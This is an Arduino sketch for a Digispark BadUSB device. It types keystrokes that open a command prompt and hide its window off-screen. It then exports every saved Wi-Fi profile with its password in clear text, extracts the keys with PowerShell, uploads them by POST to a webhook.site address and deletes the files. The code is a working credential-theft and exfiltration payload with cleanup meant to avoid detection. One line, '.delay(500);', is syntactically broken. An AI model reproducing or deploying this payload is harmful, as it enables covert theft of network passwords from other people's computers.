/*
  Following payload will grab saved Wifi password and will send them to your hosted webhook and hide the cmd windows by using technique mentioned in hak5darren
 rubberducky wiki -- Payload hide cmd window [https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---hide-cmd-window]
*/


#include "DigiKeyboardFr.h"
#define KEY_ENTER 0x28 //Return/Enter Key

void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  DigiKeyboardFr.update();
  DigiKeyboardFr.sendKeyStroke(0);
  DigiKeyboardFr.delay(3000);
  DigiKeyboardFr.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboardFr.delay(100);
  DigiKeyboardFr.println("cmd /k mode con: cols=15 lines=1"); //smallest cmd window possible
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboardFr.sendKeyStroke(KEY_L); //goto Move
  for(int i =0; i < 100; i++)
    {
      DigiKeyboardFr.sendKeyStroke(KEY_ARROW_LEFT);
    }
  DigiKeyboardFr.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboardFr.delay(100);
  DigiKeyboardFr.println("cd %temp%"); //going to temporary dir
  .delay(500);
  DigiKeyboardFr.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
  DigiKeyboardFr.delay(500);
  DigiKeyboardFr.println("powershell Invoke-WebRequest -Uri https://webhook.site/<ADD-WEBHOOK-ADDRESS-HERE> -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
  DigiKeyboardFr.delay(3000);
  DigiKeyboardFr.println("del Wi-* /s /f /q"); //cleaning up all the mess
  DigiKeyboardFr.delay(100);
  DigiKeyboardFr.println("exit");
  DigiKeyboardFr.delay(100);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboardFr.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboardFr.delay(5000);
  
}
